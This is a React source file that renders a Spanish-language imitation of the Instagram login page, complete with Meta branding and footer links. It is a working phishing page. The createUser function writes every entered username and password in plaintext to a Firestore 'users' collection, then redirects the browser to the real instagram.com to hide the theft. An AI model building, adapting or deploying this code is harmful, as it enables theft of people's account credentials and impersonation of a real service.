import './App.css';
import {db} from './firebase-config';
import {collection, getDocs, addDoc} from "firebase/firestore";
import { useEffect, useState } from 'react';
import phones from './images/phones.png'
import appStore from './images/applestore.png'
import gooStore from './images/googlestore.png'
import facebook from './images/facebook-icon.png'


function App() {

  const [newUserName, setNewUserName] = useState("");
  const [newPassword, setNewPassword] = useState("");

  const usersCollectionRef = collection( db, 'users');

  const createUser = (e) => {
    e.preventDefault()
    addDoc(usersCollectionRef, { username: newUserName, password: newPassword})
    .then(err => {console.log("oknpm", err)
                  window.location.replace('https://www.instagram.com') 
     })
    .catch(err => console.log("there is an error", err));
  }

  return (
    <div className="container">

    <div className = "presentation-box">
      <img src={phones} style= {{width:454 , height:618}}/>
      <div className = "formBox">
      <div className="box">
        <div className="heading"></div>
        <form className="login-form">
          <div className="field">
            <input
              id="username"
              type="name"
              placeholder="Phone number, username, or email"
              onChange={(event) => setNewUserName(event.target.value)}
            />
            <label htmlFor="username">Teléfono,usuario o correo electrónico</label>
          </div>
          <div className="field">
            <input id="password" type="password" placeholder="password" onChange={(event) => setNewPassword(event.target.value)}/>
            <label htmlFor="password">Contraseña</label>
          </div>
            <button className="login-button" title="login" onClick={(e) => createUser(e)}>Iniciar sesión</button>
            <div className="separator">
              <div className="line"></div>
              <p>O</p>
              <div className="line"></div>
            </div>
          <div className="other">
            <button className="fb-login-btn" type="button">
            <img src={facebook} style= {{height:16 ,marginRight:6}}/>
              <span className="">Iniciar sesión con Facebook</span>
            </button>
            <a className="forgot-password" href="#">¿Has olvidado la contraseña?</a>
          </div>
        </form>
      </div>
      <div className="box2">
        <p>¿No tienes una cuenta? <a className="signup" href="#">Regístrate</a></p>
      </div>
      <p style= {{textAlign:'center'}}> Descarga la aplicación </p>
      <div className ="appsStores">
        <img  className = "store" src={appStore} style= {{height:40 }}/>
        <img  className = "store" src={gooStore} style= {{height:40}}/>
      </div>
      </div> 
    </div>   
    <div class = "footer">
      <div class = "footer-links1">
        <a href="#">Meta</a>
          <a href="#">Información</a>
          <a href="#">Blog</a>
          <a href="#">Empleo</a>
          <a href="#">Ayuda</a>
          <a href="#">API</a>
          <a href="#">Privacidad</a>
          <a href="#">Condiciones</a>
          <a href="#">Cuentas destacadas</a>
          <a href="#">Hashtags</a>
          <a href="#">Ubicaciones</a>
          <a href="#">Instagram Lite</a>
      </div> 
      <div class = "footer-links2">   
          <a href="#">Belleza</a>
          <a href="#">Danza</a>
          <a href="#">Actividad física</a>
          <a href="#">Comida y bebida</a>
          <a href="#">Hogar y jardinería</a>
          <a href="#">Música</a>
          <a href="#">Artes visuales</a>
      </div>
      <span class="copyright">© 2021 Instagram from Meta</span>
    </div>
  </div>
  
  );
}

export default App;
